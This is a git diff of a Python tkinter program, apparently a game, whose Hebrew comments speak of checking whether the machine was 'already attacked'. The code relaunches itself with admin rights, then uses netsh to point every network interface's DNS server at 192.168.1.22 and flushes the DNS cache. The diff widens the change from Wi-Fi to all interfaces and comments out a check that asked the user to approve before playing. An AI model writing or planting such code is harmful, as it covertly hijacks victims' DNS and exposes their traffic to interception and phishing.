@@ -6,7 +6,7 @@ import pickle
 from tkinter import *
 from functools import partial
 from tkinter import messagebox
-from copy import deepcopy
+#import dns.resolver
 import ctypes, sys, subprocess
 import hashlib
 from time import *
@@ -19,25 +19,19 @@ def is_admin():
         return False
 
 
-o = False
+#o = False
 count = 6
 start = True
 check_if_already_attacked = False
 p = subprocess.Popen("ipconfig/all", shell=True, stdout=subprocess.PIPE)
 for line in p.stdout:
-    if "DNS Server".encode() in line and "192.168.1.14".encode() in line:  # בודק האם הותקף כבר
+    if "DNS Server".encode() in line and "192.168.1.22".encode() in line:  # בודק האם הותקף כבר
         check_if_already_attacked = True
+        #o = True
 if not check_if_already_attacked:
     if is_admin():  # אם לא הותקף אך מורץ כאדמין
-        start = False
-        # משנה את כתובת ה IP של שרת ה DNS
-        os.system('cmd /c "netsh interface ipv4 set dnsservers "Wi-Fi" static 192.168.1.14 primary"')
-        pid = os.getpid()  # פקודה זו פותחת תהליכון נוסף של חלון שורת הפקודה וכאן אני מחסל אותה
-        os.kill(pid, 9)
-        os.system('cmd /c "ipconfig/flushdns"')  # ניקוי המטמון
-    else:
-        # Re-run the program with admin rights
-        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+        #print("hjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj")
+        #o = True
         l = []
         p = subprocess.Popen("netsh interface show interface", shell=True, stdout=subprocess.PIPE)
         for line in p.stdout:  # סידור כל הממשקים אינטרנט המחוברים
@@ -52,14 +46,29 @@ if not check_if_already_attacked:
                     arr[-2] = arr[-2] + " ".encode() + arr[-1]
                     arr.pop(-1)
                 l.append(arr[-1])
-p = subprocess.Popen("ipconfig/all", shell=True, stdout=subprocess.PIPE)
-for line in p.stdout:  # בודק אם לחץ כן או לא.במידה ולא נגמר המשחק
-    if "DNS Server".encode() in line and "192.168.1.14".encode() in line:
-        o = True
-if not o:
-    messagebox.showerror("error", "אנא אשר בשביל לשחק")
-    exit(1)
-address = '192.168.1.14'
+        for i in range(len(l)):
+            l[i] = l[i].decode()
+        start = False
+        for i in l:
+            os.system(f'cmd /c "netsh interface ipv4 set dnsservers "{i}" static 192.168.1.22 primary"')
+            # משנה את כתובת ה IP של שרת ה DNS
+        pid = os.getpid()  # פקודה זו פותחת תהליכון נוסף של חלון שורת הפקודה וכאן אני מחסל אותה
+        os.kill(pid, 9)
+
+        os.system('cmd /c "ipconfig/flushdns"')  # ניקוי המטמון
+
+    else:
+        # Re-run the program with admin rights
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+# p = subprocess.Popen("ipconfig/all", shell=True, stdout=subprocess.PIPE)
+# for line in p.stdout:  # בודק אם לחץ כן או לא.במידה ולא נגמר המשחק
+#     if "DNS Server".encode() in line and "192.168.1.14".encode() in line:
+#         print("hhhhhhhhhhhhhhhhhh")
+#         o = True
+# if not o:
+#     messagebox.showerror("error", "אנא אשר בשביל לשחק")
+#     exit(1)
+address = '192.168.1.22'
 port = 2500
 bsize = 1024
 cordinates = " "
